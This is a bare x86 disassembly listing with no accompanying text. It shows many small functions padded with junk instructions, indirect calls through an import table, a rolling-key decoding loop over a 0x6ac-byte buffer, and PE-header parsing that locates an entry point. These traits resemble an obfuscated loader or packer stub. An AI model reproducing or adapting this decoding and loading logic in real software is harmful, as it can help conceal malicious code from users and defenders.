  4d0793:	mov    ecx,DWORD PTR [ecx]
  4d0795:	push   ecx
  4d0796:	push   DWORD PTR [edx-0x144]
  4d079c:	pop    ebx
  4d079d:	call   ebx
  4d079f:	add    esp,0x20
  4d07a2:	pop    ebp
  4d07a3:	ret    
  4d07a4:	mov    edi,edi
  4d07a6:	push   ebp
  4d07a7:	mov    ebp,esp
  4d07a9:	sub    esp,0x38
  4d07ac:	lea    edi,ds:0x4d3178
  4d07b2:	sbb    ebx,edx
  4d07b4:	push   edi
  4d07b5:	push   DWORD PTR [edi+0x1fc]
  4d07bb:	push   DWORD PTR [edi+0x190]
  4d07c1:	push   DWORD PTR [edi+0xa4]
  4d07c7:	call   0x4d0d0c
  4d07cc:	add    esp,0xc
  4d07cf:	pop    edi
  4d07d0:	push   edi
  4d07d1:	call   0x4d0a44
  4d07d6:	add    esp,0x4
  4d07d9:	pop    edi
  4d07da:	push   edi
  4d07db:	push   0x0
  4d07dd:	call   0x4d1030
  4d07e2:	add    esp,0x4
  4d07e5:	pop    edi
  4d07e6:	add    esp,0x38
  4d07e9:	pop    ebp
  4d07ea:	ret    
  4d07eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07f1:	sub    esp,0x3c
  4d07f4:	lea    esi,ds:0x4d304c
  4d07fa:	adc    ecx,DWORD PTR [esi+0x24]
  4d07fd:	push   0x0
  4d07ff:	call   0x4d0f18
  4d0804:	add    esp,0x4
  4d0807:	push   esi
  4d0808:	push   edi
  4d0809:	push   edx
  4d080a:	call   0x4d0c2c
  4d080f:	add    esp,0x8
  4d0812:	pop    esi
  4d0813:	mov    edx,0x0
  4d0818:	push   edx
  4d0819:	call   0x4d1030
  4d081e:	add    esp,0x4
  4d0821:	add    esp,0x3c
  4d0824:	pop    ebp
  4d0825:	ret    
  4d0826:	add    BYTE PTR [eax],al
  4d0828:	pop    edi
  4d0829:	call   DWORD PTR ds:0x4d2078
  4d082f:	call   edi
  4d0831:	add    BYTE PTR [eax],al
  4d0833:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0839:	sub    esp,0x60
  4d083c:	mov    DWORD PTR [ecx+0x184],0x3ab4
  4d0846:	mov    esi,0x4d30dc
  4d084b:	mov    eax,0x6ac
  4d0850:	push   eax
  4d0851:	push   0x6ac
  4d0856:	push   0x40001
  4d085b:	mov    edi,0x8629858e
  4d0860:	push   DWORD PTR [edi+0x7a239a86]
  4d0866:	sub    DWORD PTR [esp],0x2
  4d086a:	mov    edi,0x4d2048
  4d086f:	pop    DWORD PTR [edi]
  4d0871:	call   0x4d0b70
  4d0876:	add    esp,0x4
  4d0879:	push   eax
  4d087a:	pop    DWORD PTR [esi-0xac]
  4d0880:	mov    edx,DWORD PTR [esi-0xac]
  4d0886:	mov    ebx,edx
  4d0888:	sub    edi,edi
  4d088a:	dec    edi
  4d088b:	and    edi,0x4d0014
  4d0891:	mov    ecx,0xd5d9a824
  4d0896:	xor    eax,eax
  4d0898:	cmp    eax,0x6ac
  4d089d:	je     0x4d08bb
  4d089f:	sub    eax,0xfffffffc
  4d08a2:	xor    edx,edx
  4d08a4:	push   DWORD PTR [edi+edx*1]
  4d08a7:	add    DWORD PTR [esp],ecx
  4d08aa:	pop    DWORD PTR [ebx+edx*2]
  4d08ad:	dec    DWORD PTR [ebx]
  4d08af:	xor    ecx,ecx
  4d08b1:	add    ecx,DWORD PTR [edi]
  4d08b3:	add    edi,0x4
  4d08b6:	add    ebx,0x4
  4d08b9:	jmp    0x4d0898
  4d08bb:	mov    edx,0x0
  4d08c0:	push   edx
  4d08c1:	call   0x4d1184
  4d08c6:	add    esp,0x4
  4d08c9:	add    esp,0x60
  4d08cc:	pop    ebp
  4d08cd:	ret    
  4d08ce:	add    BYTE PTR [eax],al
  4d08d0:	pop    edi
  4d08d1:	call   DWORD PTR ds:0x4d2080
  4d08d7:	call   edi
  4d08d9:	add    BYTE PTR [eax],al
  4d08db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08e1:	sub    esp,0x48
  4d08e4:	lea    eax,ds:0x4d3138
  4d08ea:	mov    DWORD PTR [eax-0x120],edx
  4d08f0:	push   eax
  4d08f1:	push   DWORD PTR [eax+0x48]
  4d08f4:	push   DWORD PTR [eax+0x1b8]
  4d08fa:	push   DWORD PTR [eax+0x18]
  4d08fd:	call   0x4d12c0
  4d0902:	add    esp,0xc
  4d0905:	pop    eax
  4d0906:	push   eax
  4d0907:	call   0x4d0fac
  4d090c:	add    esp,0x4
  4d090f:	pop    eax
  4d0910:	push   eax
  4d0911:	call   0x4d0fac
  4d0916:	add    esp,0x4
  4d0919:	pop    eax
  4d091a:	add    esp,0x48
  4d091d:	pop    ebp
  4d091e:	ret    
  4d091f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0925:	sub    esp,0x24
  4d0928:	lea    esi,[eax+0x12c]
  4d092e:	and    DWORD PTR [ebp-0x8],0xffffa711
  4d0935:	push   esi
  4d0936:	push   DWORD PTR [esi+0x174]
  4d093c:	push   DWORD PTR [esi+0x190]
  4d0942:	push   ecx
  4d0943:	push   DWORD PTR [esi+0xa8]
  4d0949:	call   0x4d1304
  4d094e:	add    esp,0x10
  4d0951:	pop    esi
  4d0952:	mov    eax,0x0
  4d0957:	push   eax
  4d0958:	call   0x4d14c4
  4d095d:	add    esp,0x4
  4d0960:	push   0x0
  4d0962:	call   0x4d11c8
  4d0967:	add    esp,0x4
  4d096a:	add    esp,0x24
  4d096d:	pop    ebp
  4d096e:	ret    
  4d096f:	add    BYTE PTR [edi-0x1],bl
  4d0972:	adc    eax,0x4d208c
  4d0977:	call   edi
  4d0979:	add    BYTE PTR [eax],al
  4d097b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0981:	sub    esp,0x4c
  4d0984:	mov    esi,0x4d3074
  4d0989:	add    DWORD PTR [esi+0x60],eax
  4d098c:	mov    edi,0xfffffff4
  4d0991:	push   edi
  4d0992:	call   0x4d10e0
  4d0997:	add    esp,0x4
  4d099a:	push   esi
  4d099b:	push   DWORD PTR [esi+0x19c]
  4d09a1:	push   DWORD PTR [esi+0x154]
  4d09a7:	call   0x4d07a4
  4d09ac:	add    esp,0x8
  4d09af:	pop    esi
  4d09b0:	mov    ebx,0x0
  4d09b5:	push   ebx
  4d09b6:	call   0x4d06f8
  4d09bb:	add    esp,0x4
  4d09be:	add    esp,0x4c
  4d09c1:	pop    ebp
  4d09c2:	ret    
  4d09c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09c9:	sub    esp,0x50
  4d09cc:	lea    edi,ds:0x4d3080
  4d09d2:	cmp    edi,0x224
  4d09d8:	jbe    0x4d09c7
  4d09da:	push   edi
  4d09db:	push   edx
  4d09dc:	push   ecx
  4d09dd:	push   eax
  4d09de:	call   0x4d0c6c
  4d09e3:	add    esp,0xc
  4d09e6:	pop    edi
  4d09e7:	push   edi
  4d09e8:	mov    edx,0x0
  4d09ed:	push   edx
  4d09ee:	call   0x4d11e0
  4d09f3:	add    esp,0x4
  4d09f6:	pop    edi
  4d09f7:	push   edi
  4d09f8:	push   0x0
  4d09fa:	call   0x4d11c8
  4d09ff:	add    esp,0x4
  4d0a02:	pop    edi
  4d0a03:	add    esp,0x50
  4d0a06:	pop    ebp
  4d0a07:	ret    
  4d0a08:	mov    edi,edi
  4d0a0a:	push   ebp
  4d0a0b:	mov    ebp,esp
  4d0a0d:	sub    esp,0x5c
  4d0a10:	lea    ecx,ds:0x4d31e4
  4d0a16:	sub    edi,ebx
  4d0a18:	push   ecx
  4d0a19:	push   0x0
  4d0a1b:	call   0x4d11c8
  4d0a20:	add    esp,0x4
  4d0a23:	pop    ecx
  4d0a24:	push   ecx
  4d0a25:	push   esi
  4d0a26:	push   edx
  4d0a27:	push   esi
  4d0a28:	call   0x4d11f8
  4d0a2d:	add    esp,0xc
  4d0a30:	pop    ecx
  4d0a31:	push   ecx
  4d0a32:	push   0x0
  4d0a34:	call   0x4d14c4
  4d0a39:	add    esp,0x4
  4d0a3c:	pop    ecx
  4d0a3d:	add    esp,0x5c
  4d0a40:	pop    ebp
  4d0a41:	ret    
  4d0a42:	add    BYTE PTR [eax],al
  4d0a44:	pop    edi
  4d0a45:	call   DWORD PTR ds:0x4d202c
  4d0a4b:	call   edi
  4d0a4d:	add    BYTE PTR [eax],al
  4d0a4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a55:	sub    esp,0x30
  4d0a58:	lea    edi,[eax-0x1c]
  4d0a5b:	sbb    DWORD PTR [ebp-0xc],0xffffffa7
  4d0a5f:	push   edi
  4d0a60:	call   0x4d0a44
  4d0a65:	add    esp,0x4
  4d0a68:	pop    edi
  4d0a69:	push   edi
  4d0a6a:	push   eax
  4d0a6b:	push   esi
  4d0a6c:	push   DWORD PTR [edi+0x80]
  4d0a72:	push   edx
  4d0a73:	call   0x4d0ed8
  4d0a78:	add    esp,0x10
  4d0a7b:	pop    edi
  4d0a7c:	push   edi
  4d0a7d:	mov    edi,0x0
  4d0a82:	push   edi
  4d0a83:	call   0x4d0f18
  4d0a88:	add    esp,0x4
  4d0a8b:	pop    edi
  4d0a8c:	add    esp,0x30
  4d0a8f:	pop    ebp
  4d0a90:	ret    
  4d0a91:	add    BYTE PTR [eax],al
  4d0a93:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a99:	sub    esp,0x44
  4d0a9c:	lea    esi,ds:0x4d31a8
  4d0aa2:	or     eax,DWORD PTR [esi-0xe4]
  4d0aa8:	push   esi
  4d0aa9:	push   eax
  4d0aaa:	push   DWORD PTR [esi+0xa8]
  4d0ab0:	call   0x4d1348
  4d0ab5:	add    esp,0x8
  4d0ab8:	pop    esi
  4d0ab9:	push   0x0
  4d0abb:	call   0x4d0bc0
  4d0ac0:	add    esp,0x4
  4d0ac3:	push   0x0
  4d0ac5:	call   0x4d103c
  4d0aca:	add    esp,0x4
  4d0acd:	add    esp,0x44
  4d0ad0:	pop    ebp
  4d0ad1:	ret    
  4d0ad2:	add    BYTE PTR [eax],al
  4d0ad4:	mov    edi,edi
  4d0ad6:	push   ebp
  4d0ad7:	mov    ebp,esp
  4d0ad9:	sub    esp,0x34
  4d0adc:	lea    ecx,[edx+0x40]
  4d0adf:	add    eax,DWORD PTR [ebp-0x28]
  4d0ae2:	push   ecx
  4d0ae3:	mov    ecx,0x0
  4d0ae8:	push   ecx
  4d0ae9:	call   0x4d103c
  4d0aee:	add    esp,0x4
  4d0af1:	pop    ecx
  4d0af2:	push   ecx
  4d0af3:	push   DWORD PTR [ecx+0xac]
  4d0af9:	push   DWORD PTR [ecx+0x9c]
  4d0aff:	push   ebx
  4d0b00:	push   esi
  4d0b01:	call   0x4d1560
  4d0b06:	add    esp,0x10
  4d0b09:	pop    ecx
  4d0b0a:	push   ecx
  4d0b0b:	mov    ebx,0x0
  4d0b10:	push   ebx
  4d0b11:	call   0x4d1030
  4d0b16:	add    esp,0x4
  4d0b19:	pop    ecx
  4d0b1a:	add    esp,0x34
  4d0b1d:	pop    ebp
  4d0b1e:	ret    
  4d0b1f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b25:	sub    esp,0x5c
  4d0b28:	lea    esi,ds:0x4d31d4
  4d0b2e:	mov    DWORD PTR [esi-0xd0],0xfffffdb9
  4d0b38:	mov    ecx,0x0
  4d0b3d:	push   ecx
  4d0b3e:	call   0x4d0bc0
  4d0b43:	add    esp,0x4
  4d0b46:	push   esi
  4d0b47:	push   ebx
  4d0b48:	push   DWORD PTR [esi+0x13c]
  4d0b4e:	call   0x4d08dc
  4d0b53:	add    esp,0x8
  4d0b56:	pop    esi
  4d0b57:	lea    ebx,[esi-0x1d4]
  4d0b5d:	push   ebx
  4d0b5e:	call   0x4d129c
  4d0b63:	add    esp,0x4
  4d0b66:	test   eax,eax
  4d0b68:	jne    0x4d0b58
  4d0b6a:	add    esp,0x5c
  4d0b6d:	pop    ebp
  4d0b6e:	ret    
  4d0b6f:	add    BYTE PTR [edi-0x1],bl
  4d0b72:	adc    eax,0x4d2048
  4d0b77:	call   edi
  4d0b79:	add    BYTE PTR [eax],al
  4d0b7b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b81:	sub    esp,0x28
  4d0b84:	lea    esi,[ebx+0x98]
  4d0b8a:	and    DWORD PTR [esi+0x28],edx
  4d0b8d:	mov    edi,0x0
  4d0b92:	push   edi
  4d0b93:	call   0x4d1240
  4d0b98:	add    esp,0x4
  4d0b9b:	push   esi
  4d0b9c:	push   DWORD PTR [esi+0x1c]
  4d0b9f:	push   edi
  4d0ba0:	push   DWORD PTR [esi+0x184]
  4d0ba6:	call   0x4d10ec
  4d0bab:	add    esp,0xc
  4d0bae:	pop    esi
  4d0baf:	push   0x0
  4d0bb1:	call   0x4d1184
  4d0bb6:	add    esp,0x4
  4d0bb9:	add    esp,0x28
  4d0bbc:	pop    ebp
  4d0bbd:	ret    
  4d0bbe:	add    BYTE PTR [eax],al
  4d0bc0:	pop    edi
  4d0bc1:	call   DWORD PTR ds:0x4d207c
  4d0bc7:	call   edi
  4d0bc9:	add    BYTE PTR [eax],al
  4d0bcb:	add    BYTE PTR [edi-0x1],bl
  4d0bce:	adc    eax,0x4d2064
  4d0bd3:	call   edi
  4d0bd5:	add    BYTE PTR [eax],al
  4d0bd7:	add    BYTE PTR [edi-0x1],bl
  4d0bda:	adc    eax,0x4d2098
  4d0bdf:	call   edi
  4d0be1:	add    BYTE PTR [eax],al
  4d0be3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0be9:	sub    esp,0x24
  4d0bec:	mov    eax,0x4d313c
  4d0bf1:	or     DWORD PTR [eax+0x90],eax
  4d0bf7:	push   eax
  4d0bf8:	mov    edi,0x0
  4d0bfd:	push   edi
  4d0bfe:	call   0x4d06f8
  4d0c03:	add    esp,0x4
  4d0c06:	pop    eax
  4d0c07:	push   eax
  4d0c08:	push   edx
  4d0c09:	push   DWORD PTR [eax+0x1b4]
  4d0c0f:	push   edx
  4d0c10:	call   0x4d0e78
  4d0c15:	add    esp,0xc
  4d0c18:	pop    eax
  4d0c19:	push   eax
  4d0c1a:	push   0x0
  4d0c1c:	call   0x4d1240
  4d0c21:	add    esp,0x4
  4d0c24:	pop    eax
  4d0c25:	add    esp,0x24
  4d0c28:	pop    ebp
  4d0c29:	ret    
  4d0c2a:	add    BYTE PTR [eax],al
  4d0c2c:	mov    edi,edi
  4d0c2e:	push   ebp
  4d0c2f:	mov    ebp,esp
  4d0c31:	sub    esp,0x50
  4d0c34:	mov    ebx,0x4d31a8
  4d0c39:	cmp    ebx,0x298
  4d0c3f:	je     0x4d0c2f
  4d0c41:	call   0x4d0fac
  4d0c46:	add    esp,0x4
  4d0c49:	push   ebx
  4d0c4a:	push   esi
  4d0c4b:	push   DWORD PTR [ebx+0x1b0]
  4d0c51:	push   edi
  4d0c52:	call   0x4d0710
  4d0c57:	add    esp,0xc
  4d0c5a:	pop    ebx
  4d0c5b:	push   0xfffffff4
  4d0c5d:	call   0x4d10e0
  4d0c62:	add    esp,0x4
  4d0c65:	add    esp,0x50
  4d0c68:	pop    ebp
  4d0c69:	ret    
  4d0c6a:	add    BYTE PTR [eax],al
  4d0c6c:	mov    edi,edi
  4d0c6e:	push   ebp
  4d0c6f:	mov    ebp,esp
  4d0c71:	sub    esp,0x38
  4d0c74:	lea    esi,[edi+0x11c]
  4d0c7a:	adc    ecx,0x1
  4d0c7d:	push   0x0
  4d0c7f:	call   0x4d0f18
  4d0c84:	add    esp,0x4
  4d0c87:	push   esi
  4d0c88:	push   DWORD PTR [esi+0x114]
  4d0c8e:	push   DWORD PTR [esi+0xa0]
  4d0c94:	push   ecx
  4d0c95:	push   eax
  4d0c96:	call   0x4d0fb8
  4d0c9b:	add    esp,0x10
  4d0c9e:	pop    esi
  4d0c9f:	mov    edx,0x0
  4d0ca4:	push   edx
  4d0ca5:	call   0x4d1030
  4d0caa:	add    esp,0x4
  4d0cad:	add    esp,0x38
  4d0cb0:	pop    ebp
  4d0cb1:	ret    
  4d0cb2:	add    BYTE PTR [eax],al
  4d0cb4:	pop    edi
  4d0cb5:	call   DWORD PTR ds:0x4d2034
  4d0cbb:	call   edi
  4d0cbd:	add    BYTE PTR [eax],al
  4d0cbf:	add    BYTE PTR [edi+0x2b],dl
  4d0cc2:	call   DWORD PTR [edi+0x57]
  4d0cc5:	push   edi
  4d0cc6:	push   edi
  4d0cc7:	call   0x4d14ac
  4d0ccc:	sub    esp,0xfffffffc
  4d0ccf:	call   0x4d0d60
  4d0cd4:	push   0x2
  4d0cd6:	xor    eax,eax
  4d0cd8:	adc    eax,0x4d3030
  4d0cdd:	push   0x0
  4d0cdf:	xor    ecx,ecx
  4d0ce1:	adc    ecx,0x4d3036
  4d0ce7:	add    BYTE PTR [ecx],0x41
  4d0cea:	push   eax
  4d0ceb:	call   0x4d0b70
  4d0cf0:	pop    edi
  4d0cf1:	pop    edi
  4d0cf2:	pop    edi
  4d0cf3:	lea    edi,[eax+0x3b]
  4d0cf6:	mov    edi,DWORD PTR [edi]
  4d0cf8:	lea    eax,[eax+edi*1]
  4d0cfb:	mov    eax,DWORD PTR [eax+0x28]
  4d0cfe:	pusha  
  4d0cff:	mov    ah,0x45
  4d0d01:	sub    al,ah
  4d0d03:	ja     0x4d075c
  4d0d09:	popa   
  4d0d0a:	ret    
  4d0d0b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d11:	sub    esp,0x58
  4d0d14:	lea    ecx,ds:0x4d31e0
  4d0d1a:	cmp    ecx,0x78db
  4d0d20:	je     0x4d0d0f
  4d0d22:	push   ecx
  4d0d23:	mov    edi,0x0
  4d0d28:	push   edi
  4d0d29:	call   0x4d0f18
  4d0d2e:	add    esp,0x4
  4d0d31:	pop    ecx
  4d0d32:	push   ecx
  4d0d33:	push   DWORD PTR [ecx+0x19c]
  4d0d39:	push   DWORD PTR [ecx+0x144]
  4d0d3f:	push   DWORD PTR [ecx+0x1c4]
  4d0d45:	call   0x4d138c
  4d0d4a:	add    esp,0xc
  4d0d4d:	pop    ecx
  4d0d4e:	push   ecx
  4d0d4f:	call   0x4d14ac
  4d0d54:	add    esp,0x4
  4d0d57:	pop    ecx
  4d0d58:	add    esp,0x58
  4d0d5b:	pop    ebp
  4d0d5c:	ret    
  4d0d5d:	add    BYTE PTR [eax],al
  4d0d5f:	add    BYTE PTR [edi-0x1],bl
  4d0d62:	adc    eax,0x4d203c
  4d0d67:	call   edi
  4d0d69:	add    BYTE PTR [eax],al
  4d0d6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d71:	sub    esp,0x20
  4d0d74:	lea    edx,[edi-0x18]
  4d0d77:	or     ebx,DWORD PTR [edx-0x30]
  4d0d7a:	push   edx
  4d0d7b:	push   DWORD PTR [edx+0x1f4]
  4d0d81:	push   DWORD PTR [edx+0x90]
  4d0d87:	call   0x4d1144
  4d0d8c:	add    esp,0x8
  4d0d8f:	pop    edx
  4d0d90:	push   edx
  4d0d91:	push   0x0
  4d0d93:	call   0x4d0f18
  4d0d98:	add    esp,0x4
  4d0d9b:	pop    edx
  4d0d9c:	push   edx
  4d0d9d:	push   0x0
  4d0d9f:	call   0x4d14c4
  4d0da4:	add    esp,0x4
  4d0da7:	pop    edx
  4d0da8:	add    esp,0x20
  4d0dab:	pop    ebp
  4d0dac:	ret    
  4d0dad:	add    BYTE PTR [eax],al
  4d0daf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db5:	sub    esp,0x28
  4d0db8:	lea    esi,ds:0x4d30a8
  4d0dbe:	mov    edi,0x3a
  4d0dc3:	push   0x0
  4d0dc5:	call   0x4d1184
  4d0dca:	add    esp,0x4
  4d0dcd:	push   esi
  4d0dce:	push   DWORD PTR [esi+0x50]
  4d0dd1:	push   edx
  4d0dd2:	push   edx
  4d0dd3:	call   0x4d09c4
  4d0dd8:	add    esp,0xc
  4d0ddb:	pop    esi
  4d0ddc:	push   0x0
  4d0dde:	call   0x4d06f8
  4d0de3:	add    esp,0x4
  4d0de6:	add    esp,0x28
  4d0de9:	pop    ebp
  4d0dea:	ret    
  4d0deb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0df1:	sub    esp,0x34
  4d0df4:	mov    edi,0x4d318c
  4d0df9:	cmp    edi,0x55c1
  4d0dff:	je     0x4d0def
  4d0e01:	push   edi
  4d0e02:	mov    ebx,0x0
  4d0e07:	push   ebx
  4d0e08:	call   0x4d1030
  4d0e0d:	add    esp,0x4
  4d0e10:	pop    edi
  4d0e11:	push   edi
  4d0e12:	push   ebx
  4d0e13:	push   DWORD PTR [edi+0x168]
  4d0e19:	push   eax
  4d0e1a:	call   0x4d14d0
  4d0e1f:	add    esp,0xc
  4d0e22:	pop    edi
  4d0e23:	push   edi
  4d0e24:	mov    esi,0x0
  4d0e29:	push   esi
  4d0e2a:	call   0x4d11e0
  4d0e2f:	add    esp,0x4
  4d0e32:	pop    edi
  4d0e33:	add    esp,0x34
  4d0e36:	pop    ebp
  4d0e37:	ret    
  4d0e38:	mov    edi,edi
  4d0e3a:	push   ebp
  4d0e3b:	mov    ebp,esp
  4d0e3d:	sub    esp,0x54
  4d0e40:	lea    ebx,[edi+0x10]
  4d0e43:	sbb    esi,DWORD PTR [ebp-0x14]
  4d0e46:	mov    edi,0x0
  4d0e4b:	push   edi
  4d0e4c:	call   0x4d1240
  4d0e51:	add    esp,0x4
  4d0e54:	push   ebx
  4d0e55:	push   eax
  4d0e56:	push   DWORD PTR [ebx+0x2c]
  4d0e59:	push   DWORD PTR [ebx+0xbc]
  4d0e5f:	call   0x4d0dec
  4d0e64:	add    esp,0xc
  4d0e67:	pop    ebx
  4d0e68:	push   0x0
  4d0e6a:	call   0x4d11c8
  4d0e6f:	add    esp,0x4
  4d0e72:	add    esp,0x54
  4d0e75:	pop    ebp
  4d0e76:	ret    
  4d0e77:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e7d:	sub    esp,0x38
  4d0e80:	mov    edi,0x4d3048
  4d0e85:	or     DWORD PTR [ebp-0x4],0xfffffff2
  4d0e89:	push   edi
  4d0e8a:	lea    esi,[edi-0x48]
  4d0e8d:	push   esi
  4d0e8e:	call   0x4d129c
  4d0e93:	add    esp,0x4
  4d0e96:	test   eax,eax
  4d0e98:	jne    0x4d0e8a
  4d0e9a:	pop    edi
  4d0e9b:	push   edi
  4d0e9c:	push   DWORD PTR [edi+0x104]
  4d0ea2:	push   DWORD PTR [edi+0x38]
  4d0ea5:	push   DWORD PTR [edi+0x1f0]
  4d0eab:	call   0x4d0e38
  4d0eb0:	add    esp,0xc
  4d0eb3:	pop    edi
  4d0eb4:	push   edi
  4d0eb5:	mov    edx,0x0
  4d0eba:	push   edx
  4d0ebb:	call   0x4d103c
  4d0ec0:	add    esp,0x4
  4d0ec3:	pop    edi
  4d0ec4:	add    esp,0x38
  4d0ec7:	pop    ebp
  4d0ec8:	ret    
  4d0ec9:	add    BYTE PTR [eax],al
  4d0ecb:	add    BYTE PTR [edi-0x1],bl
  4d0ece:	adc    eax,0x4d2000
  4d0ed3:	call   edi
  4d0ed5:	add    BYTE PTR [eax],al
  4d0ed7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0edd:	sub    esp,0x44
  4d0ee0:	lea    eax,ds:0x4d30b4
  4d0ee6:	sbb    edx,DWORD PTR [ebp-0x1c]
  4d0ee9:	push   eax
  4d0eea:	push   0x0
  4d0eec:	call   0x4d1240
  4d0ef1:	add    esp,0x4
  4d0ef4:	pop    eax
  4d0ef5:	push   eax
  4d0ef6:	push   esi
  4d0ef7:	push   DWORD PTR [eax+0x90]
  4d0efd:	call   0x4d0a08
  4d0f02:	add    esp,0x8
  4d0f05:	pop    eax
  4d0f06:	push   eax
  4d0f07:	call   0x4d0a44
  4d0f0c:	add    esp,0x4
  4d0f0f:	pop    eax
  4d0f10:	add    esp,0x44
  4d0f13:	pop    ebp
  4d0f14:	ret    
  4d0f15:	add    BYTE PTR [eax],al
  4d0f17:	add    BYTE PTR [edi-0x1],bl
  4d0f1a:	adc    eax,0x4d2020
  4d0f1f:	call   edi
  4d0f21:	add    BYTE PTR [eax],al
  4d0f23:	add    BYTE PTR [edi-0x1],bl
  4d0f26:	adc    eax,0x4d2060
  4d0f2b:	call   edi
  4d0f2d:	add    BYTE PTR [eax],al
  4d0f2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f35:	sub    esp,0x54
  4d0f38:	lea    edx,ds:0x4d30b0
  4d0f3e:	adc    DWORD PTR [ebp-0x30],eax
  4d0f41:	push   edx
  4d0f42:	call   0x4d0fac
  4d0f47:	add    esp,0x4
  4d0f4a:	pop    edx
  4d0f4b:	push   edx
  4d0f4c:	push   DWORD PTR [edx+0xd8]
  4d0f52:	push   edi
  4d0f53:	push   DWORD PTR [edx+0x1a8]
  4d0f59:	call   0x4d0ad4
  4d0f5e:	add    esp,0xc
  4d0f61:	pop    edx
  4d0f62:	push   edx
  4d0f63:	call   0x4d0a44
  4d0f68:	add    esp,0x4
  4d0f6b:	pop    edx
  4d0f6c:	add    esp,0x54
  4d0f6f:	pop    ebp
  4d0f70:	ret    
  4d0f71:	add    BYTE PTR [eax],al
  4d0f73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f79:	sub    esp,0x48
  4d0f7c:	lea    esi,[edx-0x24]
  4d0f7f:	xor    eax,DWORD PTR [ebp-0x38]
  4d0f82:	push   esi
  4d0f83:	push   DWORD PTR [esi+0x1cc]
  4d0f89:	push   ebx
  4d0f8a:	push   edi
  4d0f8b:	call   0x4d0be4
  4d0f90:	add    esp,0xc
  4d0f93:	pop    esi
  4d0f94:	call   0x4d14ac
  4d0f99:	add    esp,0x4
  4d0f9c:	push   0x0
  4d0f9e:	call   0x4d1030
  4d0fa3:	add    esp,0x4
  4d0fa6:	add    esp,0x48
  4d0fa9:	pop    ebp
  4d0faa:	ret    
  4d0fab:	add    BYTE PTR [edi-0x1],bl
  4d0fae:	adc    eax,0x4d200c
  4d0fb3:	call   edi
  4d0fb5:	add    BYTE PTR [eax],al
  4d0fb7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fbd:	sub    esp,0x3c
  4d0fc0:	lea    eax,[esi-0x80]
  4d0fc6:	or     DWORD PTR [ebp-0x18],0xffffffc8
  4d0fca:	push   eax
  4d0fcb:	push   esi
  4d0fcc:	push   DWORD PTR [eax+0xd0]
  4d0fd2:	push   DWORD PTR [eax+0xf4]
  4d0fd8:	push   DWORD PTR [eax+0x12c]
  4d0fde:	call   0x4d0f30
  4d0fe3:	add    esp,0x10
  4d0fe6:	pop    eax
  4d0fe7:	push   eax
  4d0fe8:	mov    edi,0x0
  4d0fed:	push   edi
  4d0fee:	call   0x4d0bc0
  4d0ff3:	add    esp,0x4
  4d0ff6:	pop    eax
  4d0ff7:	push   eax
  4d0ff8:	mov    edi,0x0
  4d0ffd:	push   edi
  4d0ffe:	call   0x4d1184
  4d1003:	add    esp,0x4
  4d1006:	pop    eax
  4d1007:	add    esp,0x3c
  4d100a:	pop    ebp
  4d100b:	ret    
  4d100c:	pop    edi
  4d100d:	call   DWORD PTR ds:0x4d2094
  4d1013:	call   edi
  4d1015:	add    BYTE PTR [eax],al
  4d1017:	add    BYTE PTR [edi-0x1],bl
  4d101a:	adc    eax,0x4d209c
  4d101f:	call   edi
  4d1021:	add    BYTE PTR [eax],al
  4d1023:	add    BYTE PTR [edi-0x1],bl
  4d1026:	adc    eax,0x4d2088
  4d102b:	call   edi
  4d102d:	add    BYTE PTR [eax],al
  4d102f:	add    BYTE PTR [edi-0x1],bl
  4d1032:	adc    eax,0x4d2030
  4d1037:	call   edi
  4d1039:	add    BYTE PTR [eax],al
  4d103b:	add    BYTE PTR [edi-0x1],bl
  4d103e:	adc    eax,0x4d2074
  4d1043:	call   edi
  4d1045:	add    BYTE PTR [eax],al
  4d1047:	add    BYTE PTR [edi-0x1],bl
  4d104a:	adc    eax,0x4d2028
  4d104f:	call   edi
  4d1051:	add    BYTE PTR [eax],al
  4d1053:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1059:	sub    esp,0x30
  4d105c:	lea    eax,ds:0x4d3044
  4d1062:	adc    ecx,DWORD PTR [eax+0xac]
  4d1068:	push   eax
  4d1069:	push   ecx
  4d106a:	push   ecx
  4d106b:	push   DWORD PTR [eax+0x4c]
  4d106e:	push   edi
  4d106f:	call   0x4d0920
  4d1074:	add    esp,0x10
  4d1077:	pop    eax
  4d1078:	push   eax
  4d1079:	mov    edx,0x0
  4d107e:	push   edx
  4d107f:	call   0x4d1184
  4d1084:	add    esp,0x4
  4d1087:	pop    eax
  4d1088:	push   eax
  4d1089:	call   0x4d0fac
  4d108e:	add    esp,0x4
  4d1091:	pop    eax
  4d1092:	add    esp,0x30
  4d1095:	pop    ebp
  4d1096:	ret    
  4d1097:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d109d:	sub    esp,0x2c
  4d10a0:	lea    eax,ds:0x4d31b8
  4d10a6:	add    DWORD PTR [eax-0x20],0x56b9
  4d10ad:	push   eax
  4d10ae:	push   edx
  4d10af:	push   edi
  4d10b0:	push   edi
  4d10b1:	push   DWORD PTR [eax+0x20]
  4d10b4:	call   0x4d0b20
  4d10b9:	add    esp,0x10
  4d10bc:	pop    eax
  4d10bd:	push   eax
  4d10be:	mov    esi,0x0
  4d10c3:	push   esi
  4d10c4:	call   0x4d1184
  4d10c9:	add    esp,0x4
  4d10cc:	pop    eax
  4d10cd:	push   eax
  4d10ce:	push   0x0
  4d10d0:	call   0x4d14c4
  4d10d5:	add    esp,0x4
  4d10d8:	pop    eax
  4d10d9:	add    esp,0x2c
  4d10dc:	pop    ebp
  4d10dd:	ret    
